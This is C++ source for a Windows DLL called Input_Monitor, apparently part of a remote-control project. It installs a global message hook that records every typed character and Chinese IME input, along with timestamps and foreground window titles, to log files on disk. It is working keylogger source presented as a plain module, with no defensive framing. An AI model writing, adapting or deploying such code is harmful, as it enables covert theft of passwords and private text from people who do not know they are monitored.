// Input_Monitor.cpp : ���� DLL Ӧ�ó���ĵ���������
//

#include "stdafx.h"
#include<windows.h>
#include<tchar.h>
#include<Imm.h>
#include<atlstr.h>
#include<time.h>

#pragma comment(lib,"Imm32.lib")

#include "Input_Moniter.h"

#pragma data_seg("Share")

HINSTANCE g_hHinstance = NULL;
HHOOK g_hHook;
HWND g_hLastFocus = NULL;


VOID DetailRecord()
{
	char t[280]="";
	HWND hFocus;       //���浱ǰ����ھ��
	char szTitle[256]= ""; //��ǰ��������

	hFocus = GetForegroundWindow();//GetActiveWindow(); 
	//ȡ�õ�ǰ����ھ��
	//GetWindowText(hFocus, szTitle, 256);//��ǰ��������

	if (g_hLastFocus != hFocus)/*(strcmp(lastTitle, szTitle))  */          //��ǰ������Ƿ�ı�,�ı����¼ʱ�估������Ϣ
	{                           
		GetWindowTextA(hFocus, szTitle, 256);
		g_hLastFocus = hFocus;

		//CTime pt;
		//CStringA time1, time2;
		//
		char* linebreak = "\r\n";
		//pt = CTime::GetCurrentTime();
		////���ڣ��£��գ���
		//time1 = pt.Format("%Y-%m-%d ");
		////Сʱ���֣���
		//time2 = pt.Format("%H:%M:%S ");
		////a = time1.GetBuffer(0);
		struct tm *local;
		time_t TimeNow;
		TimeNow = time(NULL);
		local = localtime(&TimeNow);

		strcat(t, linebreak);
		strcat(t, asctime(local));
		//strcat(t, "  ");
		//strcat(t, time2);
		strcat(t, "  ");
		strcat(t, szTitle);
		strcat(t, linebreak);
		strcat(t, "    ");

		FILE* f = NULL;
		f = fopen("E:\\RemoteControlSever\\RESULT.txt", "ab+");
		if (f != NULL)
		{
			fwrite(t, strlen(t), 1, f);
			fclose(f);
		}		
	}
}



LRESULT CALLBACK GetMsgProc(int code,
	WPARAM wParam,
	LPARAM lParam)
{
	//code:Specifies whether the hook procedure must process the message.
	//If code is HC_ACTION, the hook procedure must process the message.
	if (HC_ACTION == code)
	{
		MSG *pMsg = (MSG*)lParam;
		switch (pMsg->message)
		{
			//Sent to an application when the IME changes composition status as a result of a keystroke.
		case WM_IME_COMPOSITION:
		{
								   if (wParam != PM_REMOVE)
									   break;
								   if (pMsg->lParam & GCS_RESULTSTR)
								   {
									   DetailRecord();
									   FILE* f1 = NULL;
									   f1 = fopen("E:\\RemoteControlSever\\report_cn.txt", "a+");
									   if (f1 != NULL)
									   {
											fprintf(f1, "\r\nWM_IME_COMPOSITION\r\n");
											fclose(f1);
									   }
									   //*********************************************UNICODEת��*****************************************
									   int iSize;	//IME����ַ����Ĵ�С	
									   LPSTR pszMultiByte = NULL;//IME����ַ���ָ��	
									   int ChineseSimpleAcp = 936;//���ֽ�ת��ʱ���ĵı���	
									   //*********************************************UNICODEת��*****************************************
									   HIMC hImc = NULL;
									   DWORD dwSize;
									   TCHAR *lpStr;
									   //first get the window for current input to the input method handle
									   hImc = ImmGetContext(pMsg->hwnd);
									   //Get string length
									   dwSize = ImmGetCompositionString(hImc, GCS_RESULTSTR, NULL, 0);
									   lpStr = (TCHAR *)malloc((dwSize + 1)*sizeof(TCHAR));
									   memset(lpStr, 0, (dwSize + 1)*sizeof(TCHAR));
									   //get string
									   ImmGetCompositionString(hImc, GCS_RESULTSTR, lpStr, dwSize);
									   //*********************************************UNICODEת��*****************************************
									   iSize = WideCharToMultiByte(ChineseSimpleAcp, 0, lpStr, -1, NULL, 0, NULL, NULL);//���㽫IME����ַ���ת��ΪASCII��׼�ֽں�Ĵ�С	
									   //Ϊת������ռ�	
									   if (pszMultiByte)
									   {
										   delete[] pszMultiByte;
										   pszMultiByte = NULL;
									   }
									   pszMultiByte = new char[iSize + 1];
									   WideCharToMultiByte(ChineseSimpleAcp, 0, lpStr, -1, pszMultiByte, iSize, NULL, NULL);//���ֽ�ת��	
									   pszMultiByte[iSize] = '\0';
									   FILE* f2 = NULL;
									   f2 = fopen("E:\\RemoteControlSever\\RESULT.txt", "ab+");
									   if (f2 != NULL)
									   {
										   fwrite(pszMultiByte, iSize, 1, f2);
										   fclose(f2);
									   }
									   //*********************************************UNICODEת��*****************************************
									   /*HANDLE m_hMapFile = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, _T("TestFileMap"));
									   LPTSTR lpMapAddr = (LPTSTR)MapViewOfFile(m_hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
									   *(HWND*)(lpMapAddr + 2) = GetActiveWindow();
									   wcscpy_s(lpMapAddr + 4, wcslen(lpStr)+1, lpStr);
									   UINT res = PostMessageW(*(HWND*)lpMapAddr, InputMonitorMsg, NULL, NULL);*/
									   free(lpStr);
									   ImmReleaseContext(pMsg->hwnd, hImc);
								   }
		}break;
		case WM_CHAR:
		{
						if (wParam != PM_REMOVE)
							break;
						if (pMsg->wParam >= 8 && pMsg->wParam <= 126)
						{
							DetailRecord();
							FILE* f1 = NULL;
							f1 = fopen("E:\\RemoteControlSever\\report_cn.txt", "a+");
							if (f1 != NULL)
							{
								fprintf(f1, "\r\nWM_CHAR\r\n");
								fclose(f1);
							}
							FILE* f2 = NULL;
							f2 = fopen("E:\\RemoteControlSever\\RESULT.txt", "ab+");
							if (f2 != NULL)
							{
								fwrite(&(pMsg->wParam), sizeof(char), 1, f2);
								fclose(f2);
							}
							/*HANDLE hMapFile = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, _T("TestFileMap"));
							LPTSTR lpMapAddr = (LPTSTR)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
							*(HWND*)(lpMapAddr + 2) = GetActiveWindow();
							*(lpMapAddr + 4) = (TCHAR)pMsg->wParam;
							*(lpMapAddr + 5) = '\0';
							UINT res = PostMessageW(*(HWND*)lpMapAddr, InputMonitorMsg, NULL, NULL);*/
						}
		}break;
		default:
		{
				   unsigned int mes;
				   PMSG pmsg = (PMSG)lParam;
				   mes = pmsg->message;
				   FILE* f1= NULL;
				   f1 = fopen("E:\\RemoteControlSever\\report_cn.txt", "a+");
				   if (f1 != NULL)
				   {					   
					   if (mes)
					   {
						   fprintf(f1, "\r\n");
						   fprintf(f1, "%d", mes);
					   }						   
					   fclose(f1);
				   }
		}break;
		}
	}
	return CallNextHookEx(g_hHook, code, wParam, lParam);
}

BOOL InstallHook()
{
	if (g_hHook)
		return TRUE;
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hHinstance, 0);
	return (g_hHook != NULL);
}

void UnHook()
{
	if (g_hHook)
	{
		UnhookWindowsHookEx(g_hHook);
		g_hHook = NULL;
	}
}

BOOL APIENTRY DllMain(HANDLE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hHinstance = HINSTANCE(hModule);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		UnHook();
		break;
	}
	return TRUE;
}

